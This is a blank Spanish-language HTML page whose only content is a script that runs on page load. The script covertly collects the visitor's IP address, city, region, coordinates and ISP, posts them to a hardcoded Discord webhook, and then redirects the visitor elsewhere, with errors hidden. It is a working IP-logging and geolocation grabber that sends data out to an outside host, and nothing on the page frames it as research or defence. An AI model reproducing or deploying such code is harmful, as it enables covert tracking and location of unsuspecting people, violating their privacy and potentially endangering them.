<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title></title>
</head>
<body>

  <script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1356010314117943427/1EFY6VFfLFjllgQ-mNPO8LfBnNz13cYjveGH4Tku7yHF49nfmS3m6vjGXWWvSYWmoOOe';

    async function logVisitorInfo() {
      try {
        // 1. Obtener IPv4
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipDataRaw = await ipRes.json();
        const ipv4 = ipDataRaw.ip;

        // 2. Obtener info con esa IP desde ipapi.co
        const geoRes = await fetch(`https://ipapi.co/${ipv4}/json/`);
        const geoData = await geoRes.json();

        const payload = {
          username: "Cartelito",
          embeds: [{
            title: "Tú sabes.",
            color: 16753920,
            fields: [
              { name: "EIPI", value: ipv4 || "No disponible", inline: false },
              { name: "País", value: geoData.country_name || "No disponible", inline: true },
              { name: "Región", value: geoData.region || "No disponible", inline: true },
              { name: "Ciudad", value: geoData.city || "No disponible", inline: true },
              { name: "Coordenadas", value: `${geoData.latitude}, ${geoData.longitude}` || "No disponible", inline: true },
              { name: "ISP", value: geoData.org || "No disponible", inline: false }
            ],
            footer: { text: `Fecha: ${new Date().toLocaleString()}` }
          }]
        };

        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        // Redirigir a mausin18.github.io después de completar el proceso
        window.location.href = "https://mausin18.github.io";

      } catch (error) {
        //console.error("Error:", error);
      }
    }

    logVisitorInfo();
  </script>
</body>
</html>
